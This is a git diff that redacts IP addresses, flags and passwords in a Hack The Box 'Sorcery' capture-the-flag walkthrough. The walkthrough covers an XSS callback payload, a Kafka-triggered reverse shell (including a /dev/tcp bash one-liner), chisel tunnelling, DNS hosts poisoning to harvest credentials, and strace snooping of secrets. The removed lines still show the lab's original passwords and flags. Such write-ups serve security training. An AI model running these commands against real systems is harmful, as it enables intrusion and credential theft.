@@ -15,10 +15,10 @@ Author: [tomadimitrie](https://app.hackthebox.com/users/775445)
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -p- --min-rate 10000 -oA scans/quickscan_alltcp 10.129.2.68
+└─$ sudo nmap -p- --min-rate 10000 -oA scans/quickscan_alltcp 10.129.xx.xx
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-14 23:22 EDT
-Warning: 10.129.2.68 giving up on port because retransmission cap hit (10).
-Nmap scan report for 10.129.2.68
+Warning: 10.129.xx.xx giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.129.xx.xx
 Host is up (0.049s latency).
 Not shown: 65533 closed tcp ports (reset)
 PORT    STATE SERVICE
@@ -29,9 +29,9 @@ Nmap done: 1 IP address (1 host up) scanned in 27.68 seconds
 ```
 
 ```bash
-└─$ sudo nmap -p22,443 -sC -sV -oA scans/details_scan 10.129.2.68
+└─$ sudo nmap -p22,443 -sC -sV -oA scans/details_scan 10.129.xx.xx
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-14 23:23 EDT
-Nmap scan report for 10.129.2.68
+Nmap scan report for 10.129.xx.xx
 Host is up (0.030s latency).
 
 PORT    STATE SERVICE  VERSION
@@ -58,7 +58,7 @@ Nmap done: 1 IP address (1 host up) scanned in 45.74 seconds
 
 Add these to `/etc/hosts` file:
 ```bash
-10.129.2.68     sorcery.htb
+10.129.xx.xx     sorcery.htb
 ```
 
 Just scan only port `22` and `443`, let's go through `443` first.
@@ -85,7 +85,7 @@ When hover on the *our repo* word, it gonna pop out at the left side of the corn
 Notice that we found another subdomain `git.sorcery.htb`. <br>
 &rarr; Let's add it to `/etc/hosts` file.
 ```bash
-10.129.2.68     git.sorcery.htb sorcery.htb
+10.129.xx.xx     git.sorcery.htb sorcery.htb
 ```
 
 Let's check out the git repo.
@@ -1327,11 +1327,11 @@ Let's test about `<script>alert(1)</script>` to see what happen.
 We can see in DEVTOOLS, the `<script>` tag has been added but does not execute. <br>
 &rarr; Let's try to alert to our kali machine.
 
-I try this payload: `<img src="http://10.10.14.59:8000/xss" />`.
+I try this payload: `<img src="http://10.xx.xx.xx:8000/xss" />`.
 ```bash
 └─$ rlwrap -cAr nc -lvnp 8000 
 listening on [any] 8000 ...
-connect to [10.10.14.59] from (UNKNOWN) [10.10.14.59] 59088
+connect to [10.xx.xx.xx] from (UNKNOWN) [10.xx.xx.xx] 59088
 zvI����I�A��W�2~�u�Qc�G�@�@��� �K���OE��%f�!H�ڸ-"s���ڢ�mKB"�+�/�,�0�
 �       ����/5
               �
@@ -1778,9 +1778,9 @@ if __name__ == "__main__":
 ```
 
 ```bash
-└─$ python3 kafka_message_publisher.py 10.10.14.10 1337
+└─$ python3 kafka_message_publisher.py 10.xx.xx.xx 1337
 [*] Starting Kafka exploit...
-[+] Sent reverse shell to 10.10.14.10:1337
+[+] Sent reverse shell to 10.xx.xx.xx:1337
 [+] Topic: update, Partition: 0
 ```
 
@@ -1820,7 +1820,7 @@ BOOM! Got the reverse shell.
 ```bash
 └─$ rlwrap -cAr nc -lvnp 1337
 listening on [any] 1337 ...
-connect to [10.10.14.10] from (UNKNOWN) [10.129.2.68] 35394
+connect to [10.xx.xx.xx] from (UNKNOWN) [10.129.xx.xx] 35394
 bash: cannot set terminal process group (8): Inappropriate ioctl for device
 bash: no job control in this shell
 bash: /root/.bashrc: Permission denied
@@ -1831,13 +1831,13 @@ So this shell is not really interactive so I use [penelope](https://github.com/b
 
 ```bash
 └─$ python3 penelope.py 1337   
-[+] Listening for reverse shells on 0.0.0.0:1337 →  127.0.0.1 • 172.16.147.138 • 10.10.14.10 • 172.17.0.1 • 172.20.0.1
+[+] Listening for reverse shells on 0.0.0.0:1337 →  127.0.0.1 • 172.xx.xx.xx • 10.xx.xx.xx • 172.xx.xx.xx • 172.xx.xx.xx
 - 🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
-[+] Got reverse shell from 7bfb70ee5b9c~10.129.2.68-Linux-x86_64 😍 Assigned SessionID <1>
+[+] Got reverse shell from 7bfb70ee5b9c~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/kali/.penelope/7bfb70ee5b9c~10.129.2.68-Linux-x86_64/2025_06_16-10_22_37-877.log 📜
+[+] Logging to /home/kali/.penelope/7bfb70ee5b9c~10.129.xx.xx-Linux-x86_64/2025_06_16-10_22_37-877.log 📜
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 bash: /root/.bashrc: Permission denied
 user@7bfb70ee5b9c:/app$
@@ -1872,7 +1872,7 @@ Let's tunnel this shell back to our kali to discover more about these services. 
 ```bash
 (Penelope)─(Session [1])> interact
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
-[+] Logging to /home/kali/.penelope/7bfb70ee5b9c~10.129.2.68-Linux-x86_64/2025_06_16-10_55_20-631.log 📜
+[+] Logging to /home/kali/.penelope/7bfb70ee5b9c~10.129.xx.xx-Linux-x86_64/2025_06_16-10_55_20-631.log 📜
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 bash: /root/.bashrc: Permission denied
 user@7bfb70ee5b9c:/app$ cd /tmp
@@ -1894,8 +1894,8 @@ On our kali machine:
 
 Victim machine:
 ```bash
-user@7bfb70ee5b9c:/tmp$ ./chisel-QsYxirww client 10.10.14.10:9000 R:1080:socks
-2025/06/16 15:06:02 client: Connecting to ws://10.10.14.10:9000
+user@7bfb70ee5b9c:/tmp$ ./chisel-QsYxirww client 10.xx.xx.xx:9000 R:1080:socks
+2025/06/16 15:06:02 client: Connecting to ws://10.xx.xx.xx:9000
 2025/06/16 15:06:03 client: Connected (Latency 35.959347ms)
 ```
 
@@ -1989,7 +1989,7 @@ root           9  0.0  0.3  36976 29968 ?        S    10:08   0:03 /usr/bin/pyth
 root          10  0.0  0.0   2576  1408 ?        S    10:08   0:00 sh -c while true; do printf "READY\n"; read line; kill -9 $PPID; printf "RESULT 2\n"; printf "OK"; done
 user          11  0.1  0.0   8812  4352 ?        S    10:08   0:13 /app/dns
 user          12  0.0  0.0  11572  4608 ?        S    10:08   0:00 /usr/sbin/dnsmasq --no-daemon --addn-hosts /dns/hosts-user --addn-hosts /dns/hosts
-user          23  0.0  0.0   4300  2944 ?        S    12:36   0:00 bash -c /bin/bash -i >& /dev/tcp/10.10.14.59/1337 0>&1
+user          23  0.0  0.0   4300  2944 ?        S    12:36   0:00 bash -c /bin/bash -i >& /dev/tcp/10.xx.xx.xx/1337 0>&1
 user          24  0.3  0.0   4300  3072 ?        S    12:36   0:00 /usr/bin/bash
 user          52  0.3  0.1  16080 11136 ?        S    12:36   0:00 /usr/bin/python3 -Wignore -c import base64,zlib;exec(zlib.decompress(base64.b64decode("eNqVWV9v40YOf5Y+xaz7YK
 user          53  0.0  0.0   4564  3584 pts/0    Ss   12:36   0:00 /usr/bin/bash -i
@@ -2004,7 +2004,7 @@ Combine these with information we get from the `Blog` section. <br>
 Let's get to in.
 
 ```bash
-user@7bfb70ee5b9c:/dns$ echo "10.10.14.10 gg.sorcery.htb" >> /dns/hosts-user
+user@7bfb70ee5b9c:/dns$ echo "10.xx.xx.xx gg.sorcery.htb" >> /dns/hosts-user
 user@7bfb70ee5b9c:/dns$ bash convert.sh
 user@7bfb70ee5b9c:/dns$ pkill -9 dnsmasq
 ```
@@ -2158,11 +2158,11 @@ Summary: <br>
 - Credential Harvest: When victim clicks link → credentials captured.
 
 ```bash
-└─$ ssh tom_summers@10.129.2.68   
+└─$ ssh tom_summers@10.129.xx.xx   
 tom_summers@main:~$ ls
 user.txt
 tom_summers@main:~$ cat user.txt
-51ad77dd9b36092421f98c2c93dd9280
+51ad77xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Grab the `user.txt` flag. Really tough!
@@ -2235,8 +2235,8 @@ Found out there is a file `Xvfb_screen0`. <br>
 &rarr; Pull it back to our machine.
 
 ```bash
-└─$ scp tom_summers@10.129.2.68:/xorg/xvfb/Xvfb_screen0 .     
-(tom_summers@10.129.2.68) Password: 
+└─$ scp tom_summers@10.129.xx.xx:/xorg/xvfb/Xvfb_screen0 .     
+(tom_summers@10.129.xx.xx) Password: 
 Xvfb_screen0
 ```
 
@@ -2274,15 +2274,15 @@ Gonna use some tools from [netpbm](https://www.commandlinux.com/man-page/man1/ne
 File Edit Search View Document Help
 
 lusername: tom_summers_admin
-password: dWpuk7cesBjT-
+password: dWpuk7xxxxxxx
 ```
 
 Got the password for `tom_summers_admin`. <br>
-&rarr; `dWpuk7cesBjT-`
+&rarr; `dWpuk7xxxxxxx`
 
 ```bash
-└─$ ssh tom_summers_admin@10.129.2.68
-(tom_summers_admin@10.129.2.68) Password: 
+└─$ ssh tom_summers_admin@10.129.xx.xx
+(tom_summers_admin@10.129.xx.xx) Password: 
 tom_summers_admin@main:~$ ls -la
 total 20
 drwxr-x--- 5 tom_summers_admin tom_summers_admin 4096 Oct 30  2024 .
@@ -2358,7 +2358,7 @@ tom_summers_admin@main:/tmp$ ./docker_process_injection.sh
 /usr/bin/strace: Process 78330 attached with 8 threads
 This account might be protected by two-factor authentication
 In case login fails, try logging in with <password><otp>
-[pid 78333] read(7, "{\"Username\":\"rebecca_smith\",\"Secret\":\"-7eAZDp9-f9mg\"}\n", 512) = 54
+[pid 78333] read(7, "{\"Username\":\"rebecca_smith\",\"Secret\":\"-7eAZDp9xxxxxx\"}\n", 512) = 54
 [pid 78333] read(7, 0xc000140836, 970)  = -1 EAGAIN (Resource temporarily unavailable)
 [pid 78333] read(7, "", 970)            = 0
 [pid 78337] --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=78339, si_uid=2003, si_status=0, si_utime=22 /* 0.22 s */, si_stime=8 /* 0.08 s */} ---
@@ -2366,17 +2366,17 @@ Authenticating with existing credentials... [Username: rebecca_smith]
 ```
 
 Got the password for `rebecca_smith`. <br>
-&rarr; `-7eAZDp9-f9mg`
+&rarr; `-7eAZDp9xxxxxx`
 
 Also there is another approach to get password of `rebecca_smith` that I used [pspy](https://github.com/DominicBreuker/pspy) to do this.
 
 ```bash
-2025/06/17 09:41:01 CMD: UID=0     PID=1198212 | htpasswd -Bbc /home/vagrant/source/registry/auth/registry.password rebecca_smith -7eAZDp9-f9mg740280
+2025/06/17 09:41:01 CMD: UID=0     PID=1198212 | htpasswd -Bbc /home/vagrant/source/registry/auth/registry.password rebecca_smith -7eAZDp9xxxxxx740280
 ```
 
 ```bash
-└─$ ssh rebecca_smith@10.129.2.68
-(rebecca_smith@10.129.2.68) Password: 
+└─$ ssh rebecca_smith@10.129.xx.xx
+(rebecca_smith@10.129.xx.xx) Password: 
 rebecca_smith@main:~$
 ```
 
@@ -2468,7 +2468,7 @@ I try some risky tools which is [PEASS](https://github.com/peass-ng/PEASS-ng). A
 &rarr; Transfer result back to our machine.
 
 ```bash
-└─$ scp rebecca_smith@10.129.2.68:/tmp/linpeas_results.txt .
+└─$ scp rebecca_smith@10.129.xx.xx:/tmp/linpeas_results.txt .
 ```
 
 Lots of information but here is what would be necessary enough.
@@ -2533,7 +2533,7 @@ done
 ...
 
 2025/06/17 14:49:11 CMD: UID=2003  PID=278063 | grep ipa 
-2025/06/17 14:49:11 CMD: UID=1638400000 PID=277271 | /usr/bin/python3 -I /usr/bin/ipa user-mod ash_winter --setattr userPassword=w@LoiU8Crmdep 
+2025/06/17 14:49:11 CMD: UID=1638400000 PID=277271 | /usr/bin/python3 -I /usr/bin/ipa user-mod ash_winter --setattr userPassword=w@LoiU8xxxxxx 
 2025/06/17 14:49:11 CMD: UID=165536 PID=8967   | /usr/bin/python3 -I /usr/libexec/ipa/ipa-custodia /etc/ipa/custodia/custodia.conf 
 2025/06/17 14:49:11 CMD: UID=165825 PID=8923   | (wsgi:ipa)      -DFOREGROUND 
 2025/06/17 14:49:11 CMD: UID=165825 PID=8915   | (wsgi:ipa)      -DFOREGROUND 
@@ -2543,18 +2543,18 @@ done
 ```
 
 Hurray! Got the password for `ash_winter`. <br>
-&rarr; `w@LoiU8Crmdep`
+&rarr; `w@LoiU8xxxxxx`
 
 ## Privilege Escalation
 ### FreeIPA (abuse ipa privilege)
 When we ssh to `ash_winter` user, we got this.
 ```bash
-└─$ ssh ash_winter@10.129.2.68     
-(ash_winter@10.129.2.68) Password: 
+└─$ ssh ash_winter@10.129.xx.xx     
+(ash_winter@10.129.xx.xx) Password: 
 Password expired. Change your password now.
-(ash_winter@10.129.2.68) Current Password: 
-(ash_winter@10.129.2.68) New password: 
-(ash_winter@10.129.2.68) Retype new password: 
+(ash_winter@10.129.xx.xx) Current Password: 
+(ash_winter@10.129.xx.xx) New password: 
+(ash_winter@10.129.xx.xx) Retype new password: 
 $ /bin/bash
 ash_winter@main:~$
 ```
@@ -2706,7 +2706,7 @@ drwx------  2 root root 4096 Sep 18  2024 .ssh
 -rw-r--r--  1 root root  165 Apr 28 13:22 .wget-hsts
 -rw-r-----  1 root root   33 Jun 17 12:46 root.txt
 root@main:~# cat root.txt
-5d679ce4fd26144a164ce5afa5044efe
+5d679cxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Pwned the `root.txt` flag.
